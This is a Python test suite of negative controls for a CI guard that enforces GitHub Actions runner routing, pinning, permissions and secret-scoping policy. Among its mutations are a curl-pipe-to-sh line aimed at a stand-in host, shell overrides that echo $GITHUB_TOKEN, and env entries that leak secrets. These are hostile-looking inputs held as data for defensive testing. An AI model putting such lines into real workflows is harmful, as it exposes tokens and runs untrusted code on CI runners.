#!/usr/bin/env python3
"""Negative controls for CI runner routing policy."""
import pathlib
import shutil
import subprocess
import tempfile
import os
import unittest

ROOT = pathlib.Path(__file__).resolve().parent.parent
# Optional overrides, used only to show new controls fail on an older guard.
GUARD = pathlib.Path(os.environ.get("ELZOO_CI_GUARD", ROOT / "scripts" / "check-ci-runners.py"))
WORKFLOWS = pathlib.Path(os.environ.get("ELZOO_CI_WORKFLOWS", ROOT / ".github" / "workflows"))
IMAGE = "ubuntu:24.04@sha256:fe81560990fae86dc4743202b2cb4d3df98d0bcf949173cecef15ce1127ef852"


class RunnerPolicyTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.temp.name)
        (self.root / ".github").mkdir()
        shutil.copytree(WORKFLOWS, self.root / ".github" / "workflows")

    def tearDown(self):
        self.temp.cleanup()

    def check(self, expected):
        result = subprocess.run(
            ["python3", str(GUARD)],
            cwd=self.root, capture_output=True, text=True, check=False
        )
        self.assertEqual(expected, result.returncode, result.stdout + result.stderr)
        return result

    def change(self, filename, old, new):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        self.assertIn(old, source)
        path.write_text(source.replace(old, new, 1))

    def change_all(self, filename, old, new):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        self.assertIn(old, source)
        path.write_text(source.replace(old, new))

    def test_reviewed_routing_passes(self):
        self.check(0)

    def test_hosted_backend_rejected(self):
        self.change("symbolic-check.yml", "[self-hosted, linux, x64, elzoo, backend]", "ubuntu-latest")
        self.check(1)

    def test_unknown_machine_selector_rejected(self):
        self.change("symbolic-check.yml", "elzoo, backend]", "elzoo, backend, other-machine]")
        self.check(1)

    def test_branch_specific_candidate_route_rejected(self):
        self.change(
            "symbolic-check.yml",
            "runs-on: [self-hosted, linux, x64, elzoo, backend]",
            "runs-on: ${{ github.head_ref == 'task/ELZ-034' && fromJSON('[\"self-hosted\",\"ci-candidate\"]') || fromJSON('[\"self-hosted\",\"linux\",\"x64\",\"elzoo\",\"backend\"]') }}",
        )
        self.check(1)

    # ELZ-040 controls: triggers, quoted keys and container image digests.
    def test_pull_request_target_rejected(self):
        self.change("symbolic-check.yml", "\n  pull_request:\n", "\n  pull_request_target:\n")
        self.check(1)

    def test_gleam_pull_request_target_rejected(self):
        self.change("symbolic-gleam.yml", "\n  pull_request:\n", "\n  pull_request_target:\n")
        self.check(1)

    def test_added_pull_request_target_rejected(self):
        self.change("symbolic-check.yml", "\n  workflow_dispatch:\n",
                    "\n  workflow_dispatch:\n  pull_request_target:\n")
        self.check(1)

    def test_unapproved_trigger_rejected(self):
        self.change("symbolic-check.yml", "\n  workflow_dispatch:\n",
                    "\n  workflow_dispatch:\n  workflow_run:\n    workflows: [other]\n")
        self.check(1)

    def test_push_branch_filter_cannot_widen(self):
        self.change("symbolic-gleam.yml", "branches: [main]", "branches: ['**']")
        self.check(1)

    def test_quoted_on_key_rejected(self):
        self.change("symbolic-check.yml", "\non:\n", '\n"on":\n')
        self.check(1)

    def test_quoted_runs_on_job_rejected(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(path.read_text() + '\n  "evil":\n    "runs-on": ubuntu-latest\n    steps:\n      - run: true\n')
        self.check(1)

    def test_container_image_without_digest_rejected(self):
        self.change("symbolic-check.yml", IMAGE, "ubuntu:latest")
        self.check(1)

    def test_gleam_container_image_without_digest_rejected(self):
        self.change("symbolic-gleam.yml", IMAGE, "ubuntu:24.04")
        self.check(1)

    def test_inline_container_image_rejected(self):
        self.change("symbolic-check.yml", "    container:\n      image: " + IMAGE, "    container: ubuntu:latest")
        self.check(1)

    def test_fork_pr_job_gate_cannot_be_removed(self):
        # ELZ-057: the backend fork-PR gate is now part of the check-fast if: line.
        self.change(
            "symbolic-check.yml",
            "    if: ${{ vars.ELZOO_CI_LANE != 'hosted' && ((github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository) || (github.event_name == 'workflow_dispatch' && inputs.tier == 'fast')) }}",
            "    if: ${{ true }}",
        )
        self.check(1)

    def test_gleam_fork_pr_job_gate_cannot_be_removed(self):
        self.change(
            "symbolic-gleam.yml",
            "    if: ${{ vars.ELZOO_CI_LANE != 'hosted' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository) }}",
            "    if: ${{ true }}",
        )
        self.check(1)

    def test_identity_gate_cannot_be_removed(self):
        self.change("symbolic-check.yml", "Verify approved backend runner", "Verify runner")
        self.check(1)

    def test_additional_ungated_backend_job_rejected(self):
        self.add_ungated_job("symbolic-check.yml")
        self.check(1)

    def test_additional_ungated_gleam_job_rejected(self):
        self.add_ungated_job("symbolic-gleam.yml")
        self.check(1)

    def test_extra_backend_job_header_rejected_independently(self):
        self.add_job_header_without_selector("symbolic-check.yml")
        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required", self.check(1).stderr)

    def test_extra_gleam_job_header_rejected_independently(self):
        self.add_job_header_without_selector("symbolic-gleam.yml")
        self.assertIn("exactly the jobs gleam, gleam-hosted are required", self.check(1).stderr)

    def add_ungated_job(self, filename):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        selector = next(line for line in source.splitlines() if line.strip().startswith("runs-on:"))
        path.write_text(source + f"\n  unreviewed:\n{selector}\n    steps:\n      - run: true\n")

    def add_job_header_without_selector(self, filename):
        path = self.root / ".github" / "workflows" / filename
        path.write_text(path.read_text() + "\n  unreviewed:\n    steps:\n      - run: true\n")

    def test_gleam_role_cannot_move(self):
        self.change("symbolic-gleam.yml", "symbolic, elzoo, gleam", "macbook-ubuntu, elzoo, backend")
        self.check(1)

    def test_unknown_workflow_rejected(self):
        (self.root / ".github" / "workflows" / "extra.yml").write_text("jobs: {}\n")
        self.check(1)

    def test_missing_workflow_rejected(self):
        (self.root / ".github" / "workflows" / "symbolic-gleam.yml").unlink()
        self.check(1)

    def test_reusable_workflow_rejected(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(path.read_text() + "\n      - uses: owner/repo/.github/workflows/ci.yml@main\n")
        self.check(1)


    # ELZ-042 controls: flow-style jobs and required job containers.
    def append(self, filename, text):
        path = self.root / ".github" / "workflows" / filename
        path.write_text(path.read_text() + text)

    def test_flow_style_backend_job_rejected(self):
        self.append("symbolic-check.yml", "  evil: {runs-on: ubuntu-latest, steps: [{run: 'true'}]}\n")
        self.assertIn("jobs must be block-style mappings", self.check(1).stderr)

    def test_flow_style_gleam_job_rejected(self):
        self.append("symbolic-gleam.yml", "  evil: {runs-on: ubuntu-latest, steps: [{run: 'true'}]}\n")
        self.assertIn("jobs must be block-style mappings", self.check(1).stderr)

    def test_explicit_key_flow_job_rejected(self):
        self.append("symbolic-check.yml", "  ? evil\n  : {runs-on: ubuntu-latest, steps: [{run: 'true'}]}\n")
        self.assertIn("jobs must be block-style mappings", self.check(1).stderr)

    def test_backend_container_removed_rejected(self):
        self.change("symbolic-check.yml", "    container:\n      image: " + IMAGE + "\n", "")
        self.assertIn("must keep one container", self.check(1).stderr)

    def test_gleam_container_removed_rejected(self):
        self.change("symbolic-gleam.yml", "    container:\n      image: " + IMAGE + "\n", "")
        self.assertIn("must keep one container", self.check(1).stderr)

    def test_container_without_image_rejected(self):
        self.change("symbolic-check.yml", "      image: " + IMAGE + "\n", "      options: --cpus 2\n")
        self.assertIn("must keep one container", self.check(1).stderr)

    def test_container_outside_job_rejected(self):
        self.change("symbolic-gleam.yml", "    container:\n      image: " + IMAGE + "\n", "")
        self.change("symbolic-gleam.yml", "\njobs:\n", "\ndefaults:\n    container:\n      image: " + IMAGE + "\n\njobs:\n")
        self.assertIn("must keep one container", self.check(1).stderr)

    # Script text and comments are not YAML keys (ELZ-040 review finding 3).
    def test_run_script_text_and_comments_allowed(self):
        # ELZ-057: apply to both backend jobs; their bodies must stay identical.
        self.change_all(
            "symbolic-check.yml",
            "          free -h || true\n",
            "          free -h || true\n"
            "          cat > /tmp/daemon.json <<'JSON'\n"
            "          {\"registry-mirrors\": []}\n"
            "          \"debug\": false\n"
            "          JSON\n"
            "          image: not-a-container-key\n"
            "          echo pull_request_target is not used here\n",
        )
        self.change("symbolic-gleam.yml", "\njobs:\n", "\n# No pull_request_target trigger.\njobs:\n")
        self.check(0)

    def test_quoted_key_after_run_script_still_rejected(self):
        self.change("symbolic-check.yml", "          free -h || true\n",
                    "          free -h || true\n        \"env\": {A: b}\n")
        self.check(1)

    def test_image_after_run_script_still_rejected(self):
        self.change("symbolic-check.yml", "          free -h || true\n",
                    "          free -h || true\n    services:\n      db:\n        image: postgres:latest\n")
        self.check(1)

    def test_explicit_indent_scalar_text_still_checked(self):
        self.change("symbolic-check.yml", "          free -h || true\n",
                    "          free -h || true\n      - run: |2\n          \"x\": y\n")
        self.check(1)


    # ELZ-042 review (PR #74 comment 6705035217) reproducers and fail-closed forms.
    BACKEND_SELECTOR = "    runs-on: [self-hosted, linux, x64, elzoo, backend]\n"
    GLEAM_SELECTOR = "    runs-on: [self-hosted, linux, x64, symbolic, elzoo, gleam]\n"

    def test_review_quoted_continuation_then_flow_job_rejected(self):
        self.append("symbolic-check.yml", '    environment: "a\nx"\n'
                                          '  evil: {runs-on: ubuntu-latest, steps: [{run: "true"}]}\n')
        self.check(1)

    def test_review_gleam_quoted_continuation_then_flow_job_rejected(self):
        self.append("symbolic-gleam.yml", '    environment: "a\nx"\n'
                                          '  evil: {runs-on: ubuntu-latest, steps: [{run: "true"}]}\n')
        self.check(1)

    def test_review_escaped_quote_continuation_rejected(self):
        self.append("symbolic-check.yml", '    environment: "a\\"\nx"\n')
        self.assertIn("quoted scalars must close on the same line", self.check(1).stderr)

    def test_review_explicit_runs_on_key_with_decoy_rejected(self):
        self.change("symbolic-check.yml", self.BACKEND_SELECTOR,
                    "    concurrency: |\n  " + self.BACKEND_SELECTOR + "    ? runs-on\n    : ubuntu-latest\n")
        self.check(1)

    def test_review_gleam_explicit_runs_on_key_with_decoy_rejected(self):
        self.change("symbolic-gleam.yml", self.GLEAM_SELECTOR,
                    "    name: |\n  " + self.GLEAM_SELECTOR + "    ? runs-on\n    : ubuntu-latest\n")
        self.check(1)

    def test_review_alias_runs_on_key_with_decoy_rejected(self):
        self.change("symbolic-check.yml", self.BACKEND_SELECTOR,
                    "    concurrency: |\n  " + self.BACKEND_SELECTOR
                    + "    environment: &k runs-on\n    *k : ubuntu-latest\n")
        self.check(1)

    def test_review_sequence_item_block_scalar_does_not_hide_keys(self):
        self.change("symbolic-check.yml", "    steps:\n",
                    '    steps:\n      - name: |\n        "run": echo hidden quoted key\n')
        self.assertIn("quoted YAML keys", self.check(1).stderr)

    def test_review_merge_key_rejected(self):
        self.change("symbolic-check.yml", "    timeout-minutes: 90\n",
                    "    timeout-minutes: 90\n    <<: {runs-on: ubuntu-latest}\n")
        self.assertIn("merge keys", self.check(1).stderr)

    def test_tagged_key_rejected(self):
        self.change("symbolic-check.yml", "    timeout-minutes: 90\n",
                    "    timeout-minutes: 90\n    !!str runs-on: ubuntu-latest\n")
        self.check(1)

    def test_multi_line_flow_collection_rejected(self):
        self.change("symbolic-check.yml", "    timeout-minutes: 90\n",
                    "    timeout-minutes: 90\n    environment: {name: a,\n      url: b}\n")
        self.assertIn("flow collections must close on the same line", self.check(1).stderr)

    def test_top_level_key_after_jobs_rejected(self):
        self.append("symbolic-gleam.yml", "env:\n  A: b\n")
        self.assertIn("jobs: must be the last top-level key", self.check(1).stderr)

    def test_second_document_rejected(self):
        self.append("symbolic-check.yml", "---\njobs: {}\n")
        self.check(1)

    def test_selector_only_in_script_text_rejected(self):
        self.change("symbolic-check.yml", self.BACKEND_SELECTOR, "    concurrency: |\n  " + self.BACKEND_SELECTOR)
        self.check(1)


    # ELZ-043 controls: split cache actions and every other action stay SHA-pinned.
    CACHE_SHA = "0057852bfaa89a56745cba8c7296529d2fc39830"

    def test_tag_pinned_cache_save_rejected(self):
        self.change("symbolic-check.yml", "actions/cache/save@" + self.CACHE_SHA, "actions/cache/save@v4")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_branch_pinned_cache_restore_rejected(self):
        self.change("symbolic-check.yml", "actions/cache/restore@" + self.CACHE_SHA, "actions/cache/restore@main")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_short_sha_action_rejected(self):
        self.change("symbolic-gleam.yml", "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
                    "actions/setup-node@49933ea")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_unpinned_added_action_rejected(self):
        self.append("symbolic-check.yml", "      - uses: actions/cache@v4\n")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_flow_mapping_unpinned_step_rejected(self):
        self.append("symbolic-check.yml", "      - { uses: actions/cache@v4 }\n")
        self.assertIn("flow mappings are outside", self.check(1).stderr)

    def test_flow_mapping_in_flow_sequence_rejected(self):
        self.append("symbolic-check.yml", "      - [ { uses: actions/cache@v4 } ]\n")
        self.assertIn("flow mappings are outside", self.check(1).stderr)

    # ELZ-043 re-review (comment 6706080840) controls.
    GATE_START = "      - name: Verify approved backend runner\n"
    GATE_END = "      - name: Report host load and memory context\n"

    def gate_text(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        start = source.index(self.GATE_START)
        return source[start:source.index(self.GATE_END, start)]

    def test_flow_sequence_step_mapping_rejected(self):
        self.append("symbolic-check.yml", "      - [ uses: actions/cache@main ]\n")
        self.assertIn("mappings inside flow sequences are outside", self.check(1).stderr)

    def test_one_line_steps_rejected(self):
        gate = self.gate_text()
        self.change("symbolic-check.yml", gate, "")
        self.change("symbolic-check.yml", "jobs:\n", "env:\n  NOTE: |\n" + gate + "\njobs:\n")
        self.change("symbolic-check.yml", "    steps:\n", "    steps: [ uses: docker://alpine:3 ]\n    old-steps:\n")
        stderr = self.check(1).stderr
        self.assertIn("mappings inside flow sequences are outside", stderr)
        self.assertIn("one block-style steps: list", stderr)

    def test_gate_only_in_block_scalar_rejected(self):
        gate = self.gate_text()
        self.change("symbolic-check.yml", gate, "")
        self.change("symbolic-check.yml", "jobs:\n", "env:\n  NOTE: |\n" + gate + "\njobs:\n")
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_uses_plain_continuation_rejected(self):
        pinned = "actions/cache/restore@" + self.CACHE_SHA + " # v4.3.0\n"
        self.change("symbolic-check.yml", pinned, pinned + "          actions/cache@v4\n")
        self.assertIn("plain-scalar continuation lines are outside", self.check(1).stderr)

    # ELZ-043 third review (comment 6706162316): the gate step cannot be switched off.
    def test_gate_step_if_rejected(self):
        self.change("symbolic-check.yml", self.GATE_END,
                    "        if: ${{ github.run_id == 0 }}\n" + self.GATE_END)
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_gate_step_continue_on_error_rejected(self):
        self.change("symbolic-check.yml", self.GATE_END, "        continue-on-error: true\n" + self.GATE_END)
        stderr = self.check(1).stderr
        self.assertIn("approved runner identity gate is missing or changed", stderr)
        self.assertIn("could disable the runner identity gate", stderr)

    def test_gate_step_shell_rejected(self):
        self.change("symbolic-check.yml", self.GATE_END, "        shell: cat {0}\n" + self.GATE_END)
        self.assertIn("could disable the runner identity gate", self.check(1).stderr)

    def test_job_defaults_shell_rejected(self):
        self.change("symbolic-check.yml", "    steps:\n", "    defaults:\n      run:\n        shell: cat {0}\n    steps:\n")
        self.assertIn("could disable the runner identity gate", self.check(1).stderr)

    def test_workflow_defaults_shell_rejected(self):
        self.change("symbolic-check.yml", "jobs:\n", "defaults:\n  run:\n    shell: cat {0}\n\njobs:\n")
        self.assertIn("could disable the runner identity gate", self.check(1).stderr)

    # ELZ-056: the Contabo VPS runner is admitted with its own ERL_FLAGS, and nothing else.
    CONTABO_CASE = """            contabo-elzoo-1)
              echo 'ERL_FLAGS=+S 4:4 +SDcpu 1 +SDio 1' >> "$GITHUB_ENV"
              ;;
"""

    def test_contabo_case_present_and_exact(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        self.assertIn(self.CONTABO_CASE, source)
        self.check(0)

    def test_contabo_case_removed_rejected(self):
        self.change("symbolic-check.yml", self.CONTABO_CASE, "")
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_contabo_erl_flags_changed_rejected(self):
        self.change("symbolic-check.yml", "ERL_FLAGS=+S 4:4 +SDcpu 1 +SDio 1' >> \"$GITHUB_ENV\"",
                    "ERL_FLAGS=+S 8:8 +SDcpu 1 +SDio 1' >> \"$GITHUB_ENV\"")
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_contabo_runner_name_changed_rejected(self):
        for name in ("contabo-elzoo-2", "contabo-elzoo-*", "contabo-*"):
            with self.subTest(name=name):
                self.change("symbolic-check.yml", "            contabo-elzoo-1)", "            " + name + ")")
                self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_additional_unlisted_runner_case_rejected(self):
        self.change("symbolic-check.yml", self.CONTABO_CASE,
                    self.CONTABO_CASE + "            other-runner) ;;\n")
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_contabo_label_in_runs_on_rejected(self):
        # The candidate is not routed: adding its label to the selector must fail the guard.
        for selector in ("[self-hosted, linux, x64, elzoo, backend, contabo]",
                         "[self-hosted, linux, x64, elzoo, contabo]",
                         "[self-hosted, linux, x64, elzoo, contabo, backend]"):
            with self.subTest(selector=selector):
                self.change("symbolic-check.yml", "[self-hosted, linux, x64, elzoo, backend]", selector)
                self.assertIn("every job must use", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    # ELZ-057: runner tiers. check-fast (pull_request and queue dispatch, tier fast) needs the fast
    # label; check-any (push and measurement dispatch, tier any) may use any backend runner.
    FAST_RUNS_ON = "    runs-on: [self-hosted, linux, x64, elzoo, backend, fast]"
    ANY_RUNS_ON = "    runs-on: [self-hosted, linux, x64, elzoo, backend]\n"
    FAST_IF = "(github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository) || (github.event_name == 'workflow_dispatch' && inputs.tier == 'fast')"
    ANY_IF = "github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && inputs.tier == 'any')"

    def test_two_tier_jobs_present_and_pinned(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        self.assertEqual(1, source.count(self.FAST_RUNS_ON))
        self.assertEqual(1, source.count(self.ANY_RUNS_ON))
        self.assertIn("  check-fast:\n", source)
        self.assertIn("  check-any:\n", source)
        self.check(0)

    def test_fast_job_without_fast_label_rejected(self):
        self.change("symbolic-check.yml", self.FAST_RUNS_ON, self.ANY_RUNS_ON.rstrip("\n"))
        self.assertIn("every job must use", self.check(1).stderr)

    def test_any_job_with_fast_label_rejected(self):
        self.change("symbolic-check.yml", self.ANY_RUNS_ON, self.FAST_RUNS_ON + "\n")
        self.assertIn("every job must use", self.check(1).stderr)

    def test_contabo_label_in_either_selector_rejected(self):
        for old, new in ((self.FAST_RUNS_ON, "    runs-on: [self-hosted, linux, x64, elzoo, backend, fast, contabo]"),
                         (self.ANY_RUNS_ON, "    runs-on: [self-hosted, linux, x64, elzoo, backend, contabo]\n")):
            with self.subTest(selector=new):
                self.change("symbolic-check.yml", old, new)
                self.assertIn("every job must use", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_fast_job_cannot_run_for_tier_any(self):
        self.change("symbolic-check.yml", "inputs.tier == 'fast'", "inputs.tier == 'any'")
        self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)

    def test_fast_job_cannot_drop_fork_pr_gate(self):
        self.change("symbolic-check.yml", "github.event.pull_request.head.repo.full_name == github.repository", "true")
        self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)

    def test_any_job_cannot_run_for_pull_request(self):
        self.change("symbolic-check.yml", "github.event_name == 'push' || (",
                    "github.event_name == 'push' || github.event_name == 'pull_request' || (")
        self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)

    def test_any_job_cannot_run_for_tier_fast(self):
        self.change("symbolic-check.yml", "inputs.tier == 'any'", "inputs.tier == 'fast'")
        self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)

    def test_tier_input_cannot_change(self):
        for old, new in (("        default: fast\n", "        default: any\n"),
                         ("        options: [fast, any]\n", "        options: [fast, any, other]\n"),
                         ("        type: choice\n", "        type: string\n"),
                         ("      tier:\n", "      tier:\n        required: false\n")):
            with self.subTest(change=new):
                self.change("symbolic-check.yml", old, new)
                self.assertIn("triggers must be exactly", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_extra_dispatch_input_rejected(self):
        self.change("symbolic-check.yml", "        default: fast\n",
                    "        default: fast\n      runner:\n        type: string\n")
        self.assertIn("triggers must be exactly", self.check(1).stderr)

    def test_bodies_must_stay_identical(self):
        # A change in only one job (here ERL_FLAGS) is rejected even though each job is otherwise valid.
        self.change("symbolic-check.yml", "      ERL_FLAGS: '+S 4:4 +SDcpu 1 +SDio 1'\n",
                    "      ERL_FLAGS: '+S 8:8 +SDcpu 1 +SDio 1'\n")
        self.assertIn("identical bodies", self.check(1).stderr)

    def test_identity_gate_removed_from_one_job_rejected(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        # Rename only the second occurrence of the gate step name.
        first = source.index("Verify approved backend runner")
        second = source.index("Verify approved backend runner", first + 1)
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(source[:second] + "Verify runner" + source[second + len("Verify approved backend runner"):])
        stderr = self.check(1).stderr
        self.assertIn("approved runner identity gate is missing or changed (check-any)", stderr)

    def test_container_digest_removed_from_one_job_rejected(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        first = source.index(IMAGE)
        second = source.index(IMAGE, first + 1)
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(source[:second] + "ubuntu:24.04" + source[second + len(IMAGE):])
        self.assertIn("digest-pinned image", self.check(1).stderr)

    def test_jobs_must_keep_names_and_order(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(source.replace("  check-fast:\n", "  TMPNAME:\n").replace("  check-any:\n", "  check-fast:\n").replace("  TMPNAME:\n", "  check-any:\n"))
        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required, in this order", self.check(1).stderr)

    def test_backend_workflow_with_one_job_rejected(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        source = path.read_text()
        path.write_text(source[:source.index("\n  check-any:\n")] + "\n")
        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required", self.check(1).stderr)

    def test_if_lines_cannot_be_swapped_between_jobs(self):
        # Swapping the two if: lines would send pull requests to check-any (any backend runner).
        self.change("symbolic-check.yml", self.FAST_IF, "TMP_SWAP")
        self.change("symbolic-check.yml", self.ANY_IF, self.FAST_IF)
        self.change("symbolic-check.yml", "TMP_SWAP", self.ANY_IF)
        self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)

    def test_pull_request_cannot_reach_any_tier_through_selector_text(self):
        # The if: lines are pinned exactly; there is no expression that routes pull requests to check-any.
        self.change("symbolic-check.yml", self.ANY_IF, self.ANY_IF + " || github.event_name == 'pull_request'")
        self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)

    # ELZ-060: the Gleam compiler is installed through the release-asset API with the job token.
    GLEAM_STEP = """      - name: Install the pinned Gleam compiler
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: ./scripts/setup.sh
"""

    def test_gleam_setup_step_present_and_pinned(self):
        source = (self.root / ".github" / "workflows" / "symbolic-gleam.yml").read_text()
        self.assertEqual(2, source.count(self.GLEAM_STEP))  # self-hosted and hosted job
        self.assertEqual(2, source.count("github.token"))
        self.check(0)

    def test_gleam_setup_step_reverted_to_plain_run_rejected(self):
        self.change("symbolic-gleam.yml", self.GLEAM_STEP, "      - run: ./scripts/setup.sh\n")
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)

    def test_gleam_setup_step_changed_rejected(self):
        for old, new in (("        run: ./scripts/setup.sh\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
                         ("Install the pinned Gleam compiler", "Install Gleam"),
                         ("          GITHUB_TOKEN: ${{ github.token }}\n",
                          "          GITHUB_TOKEN: ${{ github.token }}\n          EXTRA: value\n")):
            with self.subTest(change=new):
                self.change("symbolic-gleam.yml", old, new)
                self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_token_on_another_gleam_step_rejected(self):
        self.change("symbolic-gleam.yml", "      - run: ./scripts/check.sh\n",
                    "      - run: ./scripts/check.sh\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n")
        self.assertIn("token appears elsewhere", self.check(1).stderr)

    def test_token_in_gleam_job_env_rejected(self):
        self.change("symbolic-gleam.yml", "      ImageOS: ubuntu24\n",
                    "      ImageOS: ubuntu24\n      GITHUB_TOKEN: ${{ github.token }}\n")
        self.assertIn("token appears elsewhere", self.check(1).stderr)

    def test_secrets_in_gleam_workflow_rejected(self):
        self.change("symbolic-gleam.yml", "      ImageOS: ubuntu24\n",
                    "      ImageOS: ubuntu24\n      SECRET: ${{ secrets.ANYTHING }}\n")
        self.assertIn("token appears elsewhere", self.check(1).stderr)

    def test_other_token_spellings_rejected_everywhere(self):
        for text in ("github.TOKEN", "Github.Token", "github['token']", "github . token", "secrets['X']",
                     "SECRETS.X", "toJSON(secrets)", "toJSON(github)", "toJson( github )",
                     "join(github.*, ',')", "join(github . *, ',')"):
            for filename in ("symbolic-gleam.yml", "symbolic-check.yml"):
                with self.subTest(text=text, file=filename):
                    self.change(filename, "      ImageOS: ubuntu24\n",
                                "      ImageOS: ubuntu24\n      LEAK: ${{ " + text + " }}\n")
                    self.assertIn("github.token and secrets are not allowed" if filename == "symbolic-check.yml"
                                  else "token appears elsewhere", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_gleam_setup_step_cannot_get_extra_keys_or_move(self):
        step = self.GLEAM_STEP
        for extra in ("        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n", "        continue-on-error: true\n",
                      "        if: ${{ false }}\n", "        working-directory: /tmp\n",
                      # after a blank line or a comment line, the key still belongs to the step
                      "\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n",
                      "# note\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n",
                      "    # note\n        if: ${{ false }}\n"):
            with self.subTest(extra=extra.strip()):
                self.change("symbolic-gleam.yml", step, step + extra)
                self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()
        # Moved before the checkout step: the step text is intact but its position is not.
        path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
        source = path.read_text().replace(step, "")
        marker = "      - name: Prepare Ubuntu job container\n"
        path.write_text(source.replace(marker, step + marker, 1))
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)

    def test_token_or_secrets_in_backend_workflow_rejected(self):
        for text in ("github.token", "secrets.ANYTHING"):
            with self.subTest(text=text):
                self.change("symbolic-check.yml", "      ImageOS: ubuntu24\n",
                            "      ImageOS: ubuntu24\n      LEAK: ${{ " + text + " }}\n")
                self.assertIn("not allowed in this workflow", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    # ELZ-058: the push job may skip a repeated full check; permissions, the token and the step
    # conditions are pinned so that skipping cannot spread to pull requests or hide a failure.
    SKIP_IF = "        if: ${{ steps.skip.outputs.skip != 'true' }}\n"
    DECISION = """      - name: Decide whether the full check is redundant
        id: skip
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: python3 scripts/ci-skip-decision.py
"""
    ANY_PERMS = "    permissions:\n      actions: read\n      contents: read\n"

    def source(self):
        return (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()

    def test_decision_step_and_permissions_present_and_pinned(self):
        source = self.source()
        self.assertEqual(3, source.count(self.DECISION))
        self.assertEqual(2, source.count(self.ANY_PERMS))  # check-any and check-hosted
        self.assertEqual(6, source.count("github.token"))  # three decision steps and three S3 test server steps
        self.assertEqual(3, source.count("permissions:"))  # top level, check-any and check-hosted only
        self.check(0)

    def test_actions_read_only_on_check_any(self):
        # on check-fast (pull requests) it is rejected, as is any write scope anywhere
        source = self.source()
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(source.replace("    container:\n", self.ANY_PERMS + "    container:\n", 1))
        self.assertIn("token permissions must be exactly the reviewed ones", self.check(1).stderr)

    def test_write_permissions_rejected(self):
        for old, new in ((self.ANY_PERMS, "    permissions:\n      actions: write\n      contents: read\n"),
                         (self.ANY_PERMS, "    permissions:\n      actions: read\n      contents: write\n"),
                         (self.ANY_PERMS, "    permissions: write-all\n"),
                         ("permissions:\n  contents: read\n", "permissions:\n  contents: write\n"),
                         ("permissions:\n  contents: read\n", "permissions: write-all\n"),
                         ("permissions:\n  contents: read\n", "permissions:\n  contents: read\n  id-token: write\n")):
            with self.subTest(new=new.strip()):
                self.change("symbolic-check.yml", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_check_any_permissions_removed_or_widened_rejected(self):
        for new in ("", "    permissions:\n      contents: read\n",
                    "    permissions:\n      actions: read\n      contents: read\n      checks: read\n",
                    "    permissions:\n      contents: read\n      actions: read\n"):
            with self.subTest(new=new):
                self.change("symbolic-check.yml", self.ANY_PERMS, new)
                self.assertIn("job header lines below runs-on changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

